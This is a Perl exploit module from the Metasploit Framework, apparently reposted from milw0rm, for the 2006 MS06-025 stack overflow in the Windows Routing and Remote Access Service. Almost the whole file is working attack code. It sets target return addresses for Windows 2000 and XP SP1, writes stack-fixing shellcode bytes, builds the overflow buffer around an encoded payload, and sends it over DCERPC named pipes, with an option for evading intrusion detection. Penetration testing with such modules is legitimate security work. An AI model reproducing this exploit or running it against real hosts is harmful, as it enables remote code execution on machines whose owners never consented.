##
# This file is part of the Metasploit Framework and may be redistributed
# according to the licenses defined in the Authors field below. In the
# case of an unknown or missing license, this file defaults to the same
# license as the core Framework (dual GPLv2 and Artistic). The latest
# version of the Framework can always be obtained from metasploit.com.
##

package Msf::Exploit::rras_ms06_025;
use base "Msf::Exploit";
use strict;

use Pex::DCERPC;
use Pex::NDR;

my $advanced = {
	'FragSize'    => [ 256, 'The DCERPC fragment size' ],
	'BindEvasion' => [ 0,   'IDS Evasion of the Bind request' ],
	'DirectSMB'   => [ 0,   'Use direct SMB (445/tcp)' ],
  };

my $info = {
	'Name'    => 'Microsoft RRAS MSO6-025 Stack Overflow',
	'Version' => '$Revision: 1.1 $',
	'Authors' => 
	[ 
		'Nicolas Pouvesle <nicolas.pouvesle [at] gmail.com>',
		'H D Moore <hdm [at] metasploit.com>'
	],

	'Arch' => ['x86'],
	'OS'   => [ 'win32', 'win2000', 'winxp' ],
	'Priv' => 1,

	'AutoOpts' => { 'EXITFUNC' => 'thread' },
	'UserOpts' => {
		'RHOST' => [ 1, 'ADDR', 'The target address' ],

		# SMB connection options
		'SMBUSER' => [ 0, 'DATA', 'The SMB username to connect with', '' ],
		'SMBPASS' => [ 0, 'DATA', 'The password for specified SMB username',''],
		'SMBDOM'  => [ 0, 'DATA', 'The domain for specified SMB username', '' ],
		'SMBPIPE' => [ 1, 'DATA', 'The pipe name to use (2000=ROUTER, XP=SRVSVC)', 'ROUTER' ],
	  },

	'Payload' => {
		'Space'    => 1104,
		'BadChars' => "\x00",
		'Keys'     => ['+ws2ord'],

		# sub esp, 4097 + inc esp makes stack happy
		'Prepend' => "\x81\xc4\xff\xef\xff\xff\x44",
	  },

	'Description' => Pex::Text::Freeform(
		qq{
        This module exploits a stack overflow in the Windows Routing and Remote
		Access Service. Since the service is hosted inside svchost.exe, a failed 
		exploit attempt can cause other system services to fail as well. A valid
		username and password is required to exploit this flaw on Windows 2000. 
		When attacking XP SP1, the SMBPIPE option needs to be set to 'SRVSVC'.
}
	  ),

	'Refs' =>
	  [
		[ 'BID', '18325' ],
		[ 'CVE', '2006-2370' ],
		[ 'OSVDB', '26437' ],
		[ 'MSB', 'MS06-025' ]
	  ],

	'DefaultTarget' => 0,
	'Targets'       =>
	  [
		[ 'Automatic' ],
		[ 'Windows 2000',   0x7571c1e4 ], # pop/pop/ret
		[ 'Windows XP SP1', 0x7248d4cc ], # pop/pop/ret
	  ],

	'Keys' => ['rras'],

	'DisclosureDate' => 'Jun 13 2006',
  };

sub new {
	my ($class) = @_;
	my $self    = $class->SUPER::new( { 'Info' => $info, 'Advanced' => $advanced }, @_ );
	return ($self);
}

sub Exploit {
	my ($self)      = @_;
	my $target_host = $self->GetVar('RHOST');
	my $target_port = $self->GetVar('RPORT');
	my $target_idx  = $self->GetVar('TARGET');
	my $shellcode   = $self->GetVar('EncodedPayload')->Payload;
	my $target      = $self->Targets->[$target_idx];

	my $FragSize = $self->GetVar('FragSize') || 256;
	my $target   = $self->Targets->[$target_idx];

	my ( $res, $rpc );

	if ( !$self->InitNops(128) ) {
		$self->PrintLine("[*] Failed to initialize the nop module.");
		return;
	}

	my $pipe    = "\\" . $self->GetVar("SMBPIPE");
	my $uuid    = '20610036-fa22-11cf-9823-00a0c911e5df';
	my $version = '1.0';

	my $handle =
	  Pex::DCERPC::build_handle( $uuid, $version, 'ncacn_np', $target_host,
		$pipe );

	my $dce = Pex::DCERPC->new(
		'handle'      => $handle,
		'username'    => $self->GetVar('SMBUSER'),
		'password'    => $self->GetVar('SMBPASS'),
		'domain'      => $self->GetVar('SMBDOM'),
		'fragsize'    => $self->GetVar('FragSize'),
		'bindevasion' => $self->GetVar('BindEvasion'),
		'directsmb'   => $self->GetVar('DirectSMB'),
	  );

	if ( !$dce ) {
		$self->PrintLine("[*] Could not bind to $handle");
		return;
	}

	my $smb = $dce->{'_handles'}{$handle}{'connection'};
	if ( $target->[0] =~ /Auto/ ) {
		if ( $smb->PeerNativeOS eq 'Windows 5.0' ) {
			$target = $self->Targets->[1];
			$self->PrintLine('[*] Detected a Windows 2000 target...');
		}
		elsif ( $smb->PeerNativeOS eq 'Windows 5.1' ) {
			$target = $self->Targets->[2];
			$self->PrintLine('[*] Detected a Windows XP target...');
		}
		else {
			$self->PrintLine( '[*] No target available : ' . $smb->PeerNativeOS() );
			return;
		}
	}

	my $pattern = '';

	if ($target->[0] =~ /Windows 2000/) {

		$pattern =
		  pack( 'V', 1 ) .
		  pack( 'V', 0x49 ) .
		  $shellcode .
		  "\xeb\x06" .
		  Pex::Text::AlphaNumText(2).
		  pack( 'V', $target->[1] ) .
		  "\xe9\xb7\xfb\xff\xff" ;

	} elsif( $target->[0] =~ /Windows XP/) {

		$pattern =
		  pack( 'V', 1 ) .
		  pack( 'V', 0x49 ) .
		  Pex::Text::AlphaNumText(0x4c).
		  "\xeb\x06" .
		  Pex::Text::AlphaNumText(2).
		  pack( 'V', $target->[1] ) .
		  $shellcode;

	} else {
		self->PrintLine( '[*] No target available...');
		return;
	}

	# need to produce an exception
	my $request = $pattern . Pex::Text::AlphaNumText(0x4000 - length($pattern));

	my $len = length ($request);

	my $stub =
	  Pex::NDR::Long( int( 0x20000 ) )
	  . Pex::NDR::Long( int( $len ) )
	  . $request
	  . Pex::NDR::Long( int( $len ) );

	$self->PrintLine("[*] Sending request...");
	my @response = $dce->request( $handle, 0x0C, $stub );
	if (@response) {
		$self->PrintLine('[*] RPC server responded with:');
		foreach my $line (@response) {
			$self->PrintLine( '[*] ' . $line );
		}
		$self->PrintLine('[*] This probably means that the system is patched');
	}
	return;
}

1;

# milw0rm.com [2006-06-22]
